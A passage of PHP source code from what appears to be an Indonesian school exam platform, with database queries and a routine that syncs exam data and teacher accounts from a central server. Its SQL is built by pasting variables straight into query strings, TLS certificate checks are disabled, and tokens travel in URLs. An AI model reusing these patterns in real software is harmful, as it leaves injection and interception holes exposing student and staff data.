    WHERE pengumuman.type='internal' ORDER BY date DESC ";
    $log= $this->getDataRedis('pengumumanguru'.$this->KodeSekolah(),$sql);
    
    return $log;
  }
  function getPengumumanAdmin(){
    $sql ="SELECT * FROM pengumuman INNER JOIN pengawas ON pengawas.id_pengawas=pengumuman.user ORDER BY date DESC ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
//Bot Telegram --------------------------------
  function getGuru(){
    $idguru =$this->guru();
    if($this->level()=='admin'){
      $sql ="SELECT * FROM  pengawas ";
    }
    else{
      $sql ="SELECT * FROM  pengawas WHERE id_pengawas=$idguru";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getTelegramBotGuru(){
    $idguru =$this->guru();
    if($this->level()=='admin'){
      $sql ="SELECT * FROM  telegram_bot INNER JOIN pengawas ON id_pengawas=tlIdGuru ";
    }
    else{
      $sql ="SELECT * FROM  telegram_bot INNER JOIN pengawas ON id_pengawas=tlIdGuru  WHERE tlIdGuru=$idguru";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getTokenBot(){
    $sql ="SELECT * FROM  bot_telegram ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
//Bank Soal --------------------------------

  function getBankSoal($id=null){
    $this->PengamanHacker("Bank Soal");
    if($_SESSION['level']=='admin'){
      $sql ="SELECT *,mapel.nama as nama_mapel,mapel.level as mapel_level,mata_pelajaran.nama_mapel as nama_matapelajaran FROM mapel 
      INNER JOIN pengawas ON pengawas.id_pengawas=mapel.idguru
      INNER JOIN mata_pelajaran ON mata_pelajaran.kode_mapel=mapel.KodeMapel 
      ORDER BY date ASC";
    }
    if($_SESSION['level']=='guru'){
      $sql ="SELECT *,mapel.nama AS nama_mapel, mapel.level as mapel_level, mapel.level as mapel_level, mata_pelajaran.nama_mapel as nama_matapelajaran FROM mapel INNER JOIN pengawas 
      ON pengawas.id_pengawas=mapel.idguru 
      INNER JOIN mata_pelajaran ON mata_pelajaran.kode_mapel=mapel.KodeMapel 
      WHERE idguru='$id' ORDER BY date ASC";
    }
    return $this->getDataRedis("banksoal".$this->KodeSekolah().$id,$sql);
  }
//&Mata_Pelajaran--------------------------------------------------------
  function getMataPelajaran(){
    $this->PengamanHacker("Mata Pelajaran");
    $sql ="SELECT * FROM mata_pelajaran ORDER BY nama_mapel ASC";
    return $this->getDataRedis("mata_pelajaran".$this->KodeSekolah(),$sql);
  }
//&Pindah Nilai Ujian--------------------------------------------------------
  function getUjianBerjalan($tbjoin){
    $idguru = $this->guru();
    if($this->level() == 'admin'){
    $sql ="SELECT DISTINCT ujian.id_ujian,ujian.kode_ujian,ujian.nama,ujian.slagNama,ujian.tgl_ujian,ujian.tgl_selesai,ujian.jenisSoalUjian FROM ujian INNER JOIN $tbjoin ON $tbjoin.id_ujian = ujian.id_ujian ORDER BY tgl_ujian DESC";
    }
    else{
      $sql ="SELECT DISTINCT ujian.id_ujian,ujian.kode_ujian,ujian.nama,ujian.slagNama,ujian.tgl_ujian,ujian.tgl_selesai,ujian.jenisSoalUjian FROM ujian INNER JOIN $tbjoin ON $tbjoin.id_ujian = ujian.id_ujian 
      WHERE id_guru='$idguru'
      ORDER BY tgl_ujian DESC";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getJumlahDataUjian($idujian,$tabel,$status){
    $sql ="SELECT * FROM $tabel where id_ujian=$idujian AND selesai=$status  ";
    $log=$this->con->query($sql) or die($this->con->error);
    $cek=mysqli_num_rows($log);
    return $cek;
  }
  //pindah nilai ujian dati tabel nilai ke tabel nilia_pindah
  function getWhereUjian($table,$where=null){
      $yes=0;
      $no=0;
      $command = 'SELECT * FROM '.$table;
      if($where!=null) {
        $value = null;
        foreach($where as $f => $v) {
          $value .= "#".$f."='".$v."'";
        }
        $command .= ' WHERE '.substr($value,1);
        $command = str_replace('#',' AND ',$command);
      }
      $sql = $this->con->query($command) or die($this->con->error);
      
      foreach ($sql as $value) {
        $array= array(
          'id_nilai' =>$value['id_nilai'],
          'id_ujian' =>$value['id_ujian'],
          'id_mapel' =>$value['id_mapel'],
          'id_siswa' =>$value['id_siswa'],
          'kode_ujian' =>$value['kode_ujian'],
          'KodeMataPelajaran' =>$value['KodeMataPelajaran'],
          'ujian_mulai' =>$value['ujian_mulai'],
          'ujian_berlangsung' =>$value['ujian_berlangsung'],
          'ujian_selesai' =>$value['ujian_selesai'],
          'jml_benar' =>$value['jml_benar'],
          'jml_salah' =>$value['jml_salah'],
          'nilai_esai' =>$value['nilai_esai'],
          'skor' =>$value['skor'],
          'total' =>$value['total'],
          'status' =>$value['status'],
          'ipaddress' =>$value['ipaddress'],
          'hasil' =>$value['hasil'],
          'jawaban' =>$value['jawaban'],
          'jawaban_esai' =>$value['jawaban_esai'],
          'online' =>$value['online'],
          'blok' =>$value['blok'],
          'id_soal' =>$value['id_soal'],
          'id_opsi' =>$value['id_opsi'],
          'id_esai' =>$value['id_esai'],
          'nilai_esai2' =>$value['nilai_esai2'],
          'selesai' =>$value['selesai'],
          'cek_tombol_selesai' =>$value['cek_tombol_selesai'],
          'nilaiPaketSoal' =>$value['nilaiPaketSoal'],
        );
        $where = array(
            'id_ujian' =>$value['id_ujian'],
            'selesai' => 1,
        );
        $cek = $this->insert('nilai_pindah',$array);
        //cek jika berhasil tambah total keberhasilan
        if($cek){
          $yes++;
        }
        else{
          $no++;
        }
      } //endforace
      //cek jika ada data kegagalan maka hapus semua data yang berhasil di input
      if($no > 0){
        $this->delete('nilai_pindah',$where); 
        //jika ada yang gagal di pindah hapus nilai yg sudah di pindah
        //agar di ulang dari awal 
        $cekarray=array(
          'status'=>0,
          'data' => $no,
        );
      }else{
        $this->delete('nilai',$where);
        $cekarray=array(
          'status'=>1,
          'data' => $yes,
        );
        
      }
      $json = json_encode($cekarray);
      echo $json;
  }
//Nilai Manual Tugas Siswa

//dapodik webservice ---------------------------------------------------------
// function getDataSiswaDapodik($access_token,$npsn,$ip=null,$port,$get) {
//   $headers = array(
//     'Content-Type: application/json',
//     sprintf('Authorization: Bearer %s', $access_token)
//   );

//   if(empty($ip)){ $url = "localhost"; }else{ $url = $ip; }
  
//   $curl = curl_init("$url:$port/WebService/$get?npsn=$npsn");
//   curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  
//   $result = json_decode(curl_exec($curl));
//   return $result;
// }
// function levelKelasToRomawi($kls){
//   if($kls ==1){ $data = "I"; }
//   elseif($kls ==2){ $data = "II"; }
//   elseif($kls ==3){ $data = "III"; }
//   elseif($kls ==4){ $data = "IV"; }
//   elseif($kls ==5){ $data = "V"; }
//   elseif($kls ==6){ $data = "VI"; }
//   elseif($kls ==7){ $data = "VII"; }
//   elseif($kls ==8){ $data = "VII"; }
//   elseif($kls ==9){ $data = "IX"; }
//   elseif($kls ==10){ $data = "X"; }
//   elseif($kls ==11){ $data = "XI"; }
//   elseif($kls ==12){ $data = "XII"; }
//   elseif($kls ==13){ $data = "XIII"; }
//   else{

//   }
//   return $data;
// }

//mkks sinkron server ---------------------------------------------------------
  function getDataSinkron(){
    $sql ="SELECT * FROM  sinkron";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getSekolahSudahSinkronKode(){
    $sql ="SELECT DISTINCT tssKode,tssNama FROM  total_sekolah_sinkron";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getSekolahSudahSinkron($id){
    $sql ="SELECT * FROM  total_sekolah_sinkron WHERE tssKode='$id' ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function ResetSingkron($id){
    //reset tabel sinkron 
    $data = array(
      'jumlah'       =>null,
      'tanggal'       =>null,
      'status_sinkron'       =>0,
      'jumlah_server'       =>null,
    );
    $where  = array(
      'nama_data'       =>$id,
    );
    $sinexec =  $this->update('sinkron',$data,$where);
    if($sinexec){
      $senddata = array(
        'status' =>200,
        'pesan' =>'Berhasil Reset',
      );
      
    }
    else{
       $senddata = array(
        'status' =>203,
        'pesan' =>'Gagal',
      );
    }
     return $senddata;
  }

  function CekServer($token,$kode,$url){
    ini_set('max_execution_time', 300); //300 seconds = 5 minutes
    $urlApi = $url.'/json/json_cek_server.php?id='.$token.'&kode='.$kode;
    $json = file_get_contents($urlApi);
    $getData = json_decode($json);
    
    return $getData;
  }
  function CekServerCurl($token,$kode,$url){
    $urlApi = $url.'/json/json_cek_server.php?id='.$token.'&kode='.$kode;
    $headers = [
      'Content-Type: application/json', 
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlApi);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response);

  }
  function CekServerCurlIn($urlApi){ //digunakan untuk get data json api
    $headers = [
      'Content-Type: application/json',
      // "Accept: application/json", 
      //"Authorization: Bearer {token}",
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlApi);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;

  }

  function KirimLogSinkron($id=null,$jml=null){
    $settingServer = $this->GetSettingDataServer();
    $token = $settingServer['tokenApi'];
    $kode = $settingServer['id_server'];
    $url = $settingServer['db_host'];
    $namaSekolah = $settingServer['sekolah'];
    $datetime = date('Y-m-d H:i:s');

    $dataSend = array(
      'tssKode'           =>$settingServer['kode_sekolah'],
      'tssNama'           =>base64_encode($namaSekolah),
      'tssKepalaSekolah'  =>base64_encode($settingServer['kepsek']),
      'tssOpretator'      =>base64_encode($settingServer['protek']),
      'tssDateSinkron'    =>base64_encode($datetime),
      'tssNamaSinkron'    =>$id,
      'tssJmlDataOk'      =>$jml,
    );
    $dataSend2 = json_encode($dataSend);

    $urlApiGet = $url.'json/api_insert_aksi.php?id='.$token.'&kode='.$kode.'&data='.$dataSend2;
    // $jsonGet = file_get_contents($urlApiGet);
    

    $ch = curl_init($urlApiGet);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
  }

  function getDataServer($id){
    //KELAS','MAPEL','BANK_SOAL','SOAL
    $settingServer = $this->GetSettingDataServer();
    $token = $settingServer['tokenApi'];
    $kode = $settingServer['id_server'];
    $url = $settingServer['db_host'];

    
    $this->RedisKoneksi()->flushall();

    $datetime = date('Y-m-d H:i:s');

    ini_set('max_execution_time', 300); //300 seconds = 5 minutes
    
    ////INSERT LEVEL KELAS
    if($id == 'KELAS'){ 
      $urlApi = $url.'/json/json_level.php?id='.$token;

      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $val) {
            $data_level = array(
              'idlevel' =>$val->idlevel,
              'kode_level' =>$val->kode_level,
              'keterangan' =>$val->keterangan,
            );
            $where = array(
              'kode_level' =>$val->kode_level,
            );
            $cekData = $this->fetch('level',$where);
            if(count($cekData) > 0) {
              $ex= $this->update('level',$data_level,$where);
              $pesanAksi="Berhasil Update";
            }
            else{
              $ex= $this->insert('level',$data_level);
              $pesanAksi="Berhasil Tambah";
            }
            
            if($ex){
              $yes++;
            }
            else{
              $no++;
            }
          }
          $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Level Kelas',
            );
            //kirim aktivitas ke server ---------------------------------
            $this->KirimLogSinkron($id,$yes);
            //kirim aktivitas ke server ---------------------------------
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Level Kelas',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    ////INSERT MAPEL
    elseif($id == 'MAPEL'){
      $urlApi = $url.'/json/json_mapel.php?id='.$token.'&kode='.$kode;
      $tabel = 'mata_pelajaran';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $data) {
            $data_level = array(
              'idmapel' => $data->idmapel,
              'kode_mapel' => $data->kode_mapel,
              'nama_mapel' => $data->nama_mapel,
              'mata_pelajaran_id' => $data->mata_pelajaran_id,
              'kode_level' => $data->kode_level,
            );
            $where = array(
              'kode_mapel' => $data->kode_mapel,
            );
            $cekData = $this->fetch($tabel,$where);
            if(count($cekData) > 0) {
              $ex= $this->update($tabel,$data_level,$where);
              $pesanAksi="Berhasil Update";
            }
            else{
              $ex= $this->insert($tabel,$data_level);
              $pesanAksi="Berhasil Tambah";
            }
            
            if($ex){
              $yes++;
            }
            else{
              $no++;
            }
          }
           $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Mapel',
            );
            $this->KirimLogSinkron($id,$yes);
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Mapel',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    //INSERT BANK SOAL
    elseif($id == 'BANK_SOAL'){
      $urlApi = $url.'/json/json_bank_soal.php?id='.$token.'&kode='.$kode;
      $tabel = 'mapel';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $data) {
            //cek guru -------------------------------------
            $where_pengawas = array(
              'id_pengawas' => $data->idguru,
            );
            $dataPengawas = array(
              'id_pengawas'         =>$data->id_pengawas,
              'nip'                 =>$data->nip,
              'nama'                =>$data->nama,
              'jabatan'             =>$data->jabatan,
              'username'            =>$data->username,
              'password'            =>$data->password,
              'level'               =>$data->level,
              'password2'           =>$data->password2,
              'id_kls'              =>$data->id_kls,
              'id_jrs'              =>$data->id_jrs,
              'foto_pengawas'       =>$data->foto_pengawas,
              'pengawas_created'    =>$data->pengawas_created,
            );

            $cekPengawas = $this->fetch('pengawas',$where_pengawas);
            if(count($cekPengawas) <= 0 ){
              $this->insert('pengawas',$dataPengawas);
            }

            $data_level = array(
              'id_mapel' => $data->id_mapel,
              'idpk' => $data->idpk,
              'idguru' => $data->idguru,
              'KodeMapel' => $data->KodeMapel,
              'nama' => $data->nama_mapel,
              'jml_soal' => $data->jml_soal,
              'jml_esai' => $data->jml_esai,
              'tampil_pg' => $data->tampil_pg,
              'tampil_esai' => $data->tampil_esai,
              'bobot_pg' => $data->bobot_pg,
              'bobot_esai' => $data->bobot_esai,
              'level' => $data->level_mapel,
              'opsi' => $data->opsi,
              'kelas' => $data->kelas,
              'siswa' => $data->siswa,
              'date' => $data->date,
              'status' => $data->status,
              'statusujian' => $data->statusujian,
              'jenisSoalUjian' => $data->jenisSoalUjian,
              'soalAgama' => $data->soalAgama,
              'soalAgamaList' => $data->soalAgamaList,
              'soalPaket' => $data->soalPaket,
            );
            $where = array(
              'nama' => $data->nama_mapel,
            );
            $cekData = $this->fetch($tabel,$where);
            if(count($cekData) > 0) {
              $ex= $this->update($tabel,$data_level,$where);
              $pesanAksi="Berhasil Update";
            }
            else{
              $ex= $this->insert($tabel,$data_level);
              $pesanAksi="Berhasil Tambah";
            }
            
            if($ex){
              $yes++;
            }
            else{
              $no++;
            }
          }
          $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Bank Soal',
            );
            $this->KirimLogSinkron($id,$yes);
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Bank Soal',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    //INSERT SOAL
    elseif($id == 'SOAL'){
      $urlApi = $url.'/json/json_soal.php?id='.$token.'&kode='.$kode;
      $tabel = 'soal';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $data) {
            $data_level = array(
              'id_soal'   => $data->id_soal,
              'id_mapel'  =>$data->id_mapel,
              'nomor'     =>$data->nomor,
              'soal'      =>addslashes($data->soal),
              'jenis'     => $data->jenis,
              'pilA'      =>addslashes($data->pilA),
              'pilB'      =>addslashes($data->pilB),
              'pilC'      =>addslashes($data->pilC),
              'pilD'      =>addslashes($data->pilD),
              'pilE'      =>addslashes($data->pilE),
              'jawaban'   => $data->jawaban,
              'file'      =>addslashes($data->file),
              'file1'     =>addslashes($data->file1),
              'fileA'     =>addslashes($data->fileA),
              'fileB'     =>addslashes($data->fileB),
              'fileC'     =>addslashes($data->fileC),
              'fileD'     =>addslashes($data->fileD),
              'fileE'     =>addslashes($data->fileE),
            );
            $where = array(
              'id_soal' => $data->id_soal,
            );
            $cekData = $this->fetch($tabel,$where);
            if(count($cekData) > 0) {
              $ex= $this->update($tabel,$data_level,$where);
              $pesanAksi="Berhasil Update";
            }
            else{
              $ex= $this->insert($tabel,$data_level);
              $pesanAksi="Berhasil Tambah";
            }
            
            if($ex){
              $yes++;
            }
            else{
              $no++;
            }
          }
           $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Soal',
            );
            $this->KirimLogSinkron($id,$yes);
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Soal',
            );
          }
         
           
          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
    }
    //INSERT JADWAL
    elseif($id == 'JADWAL'){
     
      $urlApi = $url.'/json/json_jadwal.php?id='.$token;
      $tabel = 'ujian';
      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);

     if($getData->status == 200){
        if(!empty($getData->data)){
          $yes=0; $no=0;
          foreach ($getData->data as $data) {
            
            $data_array = array(
              "id_ujian"=> $data->id_ujian,
              "id_pk"=> $data->id_pk,
              "id_guru"=> $data->id_guru,
              "id_mapel"=> $data->id_mapel,
              "kode_ujian"=> $data->kode_ujian,
              "KodeMataPelajaran"=> $data->KodeMataPelajaran,
              "nama"=> $data->nama,
              "slagNama"=> $data->slagNama,
              "jml_soal"=> $data->jml_soal,
              "jml_esai"=> $data->jml_esai,
              "bobot_pg"=> $data->bobot_pg,
              "opsi"=> $data->opsi,
              "bobot_esai"=> $data->bobot_esai,
              "tampil_pg"=> $data->tampil_pg,
              "tampil_esai"=> $data->tampil_esai,
              "lama_ujian"=> $data->lama_ujian,
              "tgl_ujian"=> $data->tgl_ujian,
              "tgl_selesai"=> $data->tgl_selesai,
              "waktu_ujian"=> $data->waktu_ujian,
              //"selesai_ujian" => $waktu_selesai,
              "level"=> $data->level,
              "kelas"=> addslashes($data->kelas),
              "siswa"=> addslashes($data->siswa),
              "sesi"=> $data->sesi,
              "acak"=> $data->acak,
              "token"=> $data->token,
              "status"=> $data->status,
              "hasil"=> $data->hasil,
              "kkm"=> $data->kkm,
              "ulang"=> $data->ulang,
              "tombol_selsai"=> $data->tombol_selsai,
              "acak_opsi"=> $data->acak_opsi,
              "history"=> $data->history,
              "status_reset"=> $data->status_reset,
              "jenisSoalUjian"=> $data->jenisSoalUjian,
              "soalAgama"=> $data->soalAgama,
              "soalAgamaList"=> $data->soalAgamaList,
              "soalPaket"=> $data->soalPaket,
            );
            // $data_update = array(
            //   "id_pk"=> $data->id_pk,
            //   "id_guru"=> $data->id_guru,
            //   "id_mapel"=> $data->id_mapel,
            //   "kode_ujian"=> $data->kode_ujian,
            //   "KodeMataPelajaran"=> $data->KodeMataPelajaran,
            //   "nama"=> $data->nama,
            //   "slagNama"=> $data->slagNama,
            //   "jml_soal"=> $data->jml_soal,
            //   "jml_esai"=> $data->jml_esai,
            //   "bobot_pg"=> $data->bobot_pg,
            //   "opsi"=> $data->opsi,
            //   "bobot_esai"=> $data->bobot_esai,
            //   "tampil_pg"=> $data->tampil_pg,
            //   "tampil_esai"=> $data->tampil_esai,
            //   "lama_ujian"=> $data->lama_ujian,
            //   "tgl_ujian"=> $data->tgl_ujian,
            //   "tgl_selesai"=> $data->tgl_selesai,
            //   "waktu_ujian"=> $data->waktu_ujian,
            //   //"selesai_ujian" => $waktu_selesai,
            //   "level"=> $data->level,
            //   "kelas"=> addslashes($data->kelas),
            //   "siswa"=> addslashes($data->siswa),
            //   "sesi"=> $data->sesi,
            //   "acak"=> $data->acak,
            //   "token"=> $data->token,
            //   "status"=> $data->status,
            //   "hasil"=> $data->hasil,
            //   "kkm"=> $data->kkm,
            //   "ulang"=> $data->ulang,
            //   "tombol_selsai"=> $data->tombol_selsai,
            //   "acak_opsi"=> $data->acak_opsi,
            //   "history"=> $data->history,
            //   "status_reset"=> $data->status_reset,
            //   "jenisSoalUjian"=> $data->jenisSoalUjian,
            //   "soalAgama"=> $data->soalAgama,
            //   "soalAgamaList"=> $data->soalAgamaList,
            //   "soalPaket"=> $data->soalPaket,
            // );
            $where = array(
              "nama"=> $data->nama,
              //"id_ujian"=> $data->id_ujian,
            );
           
            $cekData = $this->fetch($tabel,$where);
              if(count($cekData) > 0) {
                $ex= $this->update($tabel,$data_array,$where);
                $pesanAksi="Berhasil Update";
              }
              else{
                $ex= $this->insert($tabel,$data_array);
                $pesanAksi="Berhasil Tambah";
              }
              
              if($ex){
                $yes++;
              }
              else{
                $no++;
              }
           
          }

           $sindata = array(
            'jumlah' => $yes,
            'jumlah_server' =>$getData->jumlah,
            'status_sinkron' =>1,
            'tanggal' =>$datetime 
          );
          $sinwhere = array(
            'nama_data' =>$id
          );
          $sinexec =  $this->update('sinkron',$sindata,$sinwhere);
          if($sinexec){
            $senddata = array(
              'status' =>200,
              'pesan' =>$pesanAksi,
              'jumlah' =>$yes.' Jadwal',
            );
            $this->KirimLogSinkron($id,$yes);
          }
          else{
            $senddata = array(
              'status' =>203,
              'pesan' =>'Gagal Simpan Data ke Tabel Sinkron',
              'jumlah' =>$no.' Jadwal',
            );
          }

          return $senddata;

        }else{
          $senddata = array(
              'status' =>203,
              'pesan' =>'Data Di Server Kosong',
              'jumlah' =>'',
            );
          return $senddata ; //data kosong
        }
      }
      else{
        $senddata = array(
          'status' =>203,
          'pesan' =>$getData->pesan,
          'jumlah' =>'',
        );
        return $senddata;
      }
      
      
    }
    //INSERT SERVER/SESI/RUANG/KELAS/JURUSAN
    elseif($id == 'DATA_MASTER'){ 
      $urlApi       = $url.'/json/json_data_master.php?id='.$token.'&kode='.$kode;
      $tabelServer  = 'server';
      $tabelSesi    = 'sesi';
      $tabelRuang   = 'ruang';
      $tabelJurusan = 'pk';
      $tabelKelas   = 'kelas';

      $json = $this->CekServerCurlIn($urlApi);
      $getData = json_decode($json);
      //cek apakah status berhasil
      if($getData->status == 200){
        
        //cek Level Kelas Dahulu
        $cekLevelKelas = $this->fetchCount('level');
        if(count($cekLevelKelas) > 0) {
          //jika data tidak kosong
          if(!empty($getData->datanya)){
            $yes1=0; $no1=0;$yes2=0; $no2=0;$yes3=0; $no3=0;$yes4=0; $no4=0;$yes5=0; $no5=0;
            $jml1=0;$jml2=0;$jml3=0;$jml4=0;$jml5=0;
              
              $jml1 = $getData->datanya->data_server->jumlah;
              foreach ($getData->datanya->data_server->data as $data11){
                
                $where_data11 = array(
                  'kode_server' => $data11->kode_server,
                );
                $dataServer = array(
                  "kode_server"   =>$data11->kode_server,
                  "nama_server"   =>$data11->nama_server,
                  "status"        =>$data11->status,
                );
                  //cek apakah data sudah ada --------
                $cekData11 = $this->fetch($tabelServer,$where_data11);
                if(count($cekData11) > 0) {
                  $ex= $this->update($tabelServer,$dataServer,$where_data11);
                }
                else{
                  $ex= $this->insert($tabelServer,$dataServer);
                }
                  //hitung jumlah insert atau jumlah update
                if($ex){ $yes1++; }else{ $no1++; }
              }//end forace data1

              //insert Jurusan
              $jml2 = $getData->datanya->data_jurusan->jumlah;
              foreach ($getData->datanya->data_jurusan->data as $dataa){
                $where_data = array(
                  'id_pk' => $dataa->id_pk,
                );
                $data = array(
                  "idpk"              =>$dataa->idpk,
                  "id_pk"             =>$dataa->id_pk,
                  "program_keahlian"  =>$dataa->program_keahlian,
                );
                  //cek apakah data sudah ada --------
                $cekData2 = $this->fetch($tabelJurusan,$where_data);
                if(count($cekData2) > 0) {
                  $ex2= $this->update($tabelJurusan,$data,$where_data);
                }
                else{
                  $ex2= $this->insert($tabelJurusan,$data);
                }
                    //hitung jumlah insert atau jumlah update
                if($ex2){ $yes2++; }else{ $no2++; }
              }//end forace data2

              //insert Kelas
              $jml3 = $getData->datanya->data_kelas->jumlah;
              foreach ($getData->datanya->data_kelas->data as $dataa){
                $where_data = array(
                  'id_kelas' => $dataa->id_kelas,
                );
                $data = array(
                  "idkls"     =>$dataa->idkls,
                  "id_kelas"  =>$dataa->id_kelas,
                  "nama"      =>$dataa->nama,
                  "id_level"  =>$dataa->id_level,
                  "id_pk"     =>$dataa->id_pk,
                );
                  //cek apakah data sudah ada --------
                $cekData3 = $this->fetch($tabelKelas,$where_data);
                if(count($cekData3) > 0) {
                  $ex3= $this->update($tabelKelas,$data,$where_data);
                }
                else{
                  $ex3= $this->insert($tabelKelas,$data);
                }
                    //hitung jumlah insert atau jumlah update
                if($ex3){ $yes3++; }else{ $no3++; }
              }//end forace data3

              //insert Sesi
              $jml4 = $getData->datanya->data_sesi->jumlah;
              foreach ($getData->datanya->data_sesi->data as $dataa){
                $where_data = array(
                  'kode_sesi' => $dataa->kode_sesi,
                );
                $data = array(
                  "kode_sesi"    =>$dataa->kode_sesi,
                  "nama_sesi"    =>$dataa->nama_sesi,
                );
                  //cek apakah data sudah ada --------
                $cekData4 = $this->fetch($tabelSesi,$where_data);
                if(count($cekData4) > 0) {
                  $ex4= $this->update($tabelSesi,$data,$where_data);
                }
                else{
                  $ex4= $this->insert($tabelSesi,$data);
                }
                    //hitung jumlah insert atau jumlah update
                if($ex4){ $yes4++; }else{ $no4++; }
              }//end forace data4

              //insert Ruang
              $jml5 = $getData->datanya->data_ruang->jumlah;
              foreach ($getData->datanya->data_ruang->data as $dataa){
                $where_data = array(
                  'kode_ruang' => $dataa->kode_ruang,
                );
                $data = array(
                  "kode_ruang"    =>$dataa->kode_ruang,
                  "keterangan"   =>$dataa->keterangan,
                );
                  //cek apakah data sudah ada --------
                $cekData5 = $this->fetch($tabelRuang,$where_data);
                if(count($cekData4) > 0) {
                  $ex5= $this->update($tabelRuang,$data,$where_data);
                }
                else{
                  $ex5= $this->insert($tabelRuang,$data);
                }
                    //hitung jumlah insert atau jumlah update
                if($ex5){ $yes5++; }else{ $no5++; }
              }//end forace data5
              
                //server/jurusan/kelas/sesi/ruang
                //simpan data ke tabel sinkron
                $sindata = array(
                  'jumlah' => $yes1.'/'.$yes3.'/'.$yes4.'/'.$yes5,
                  'jumlah_server' => $jml1.'/'.$jml3.'/'.$jml4.'/'.$jml5,
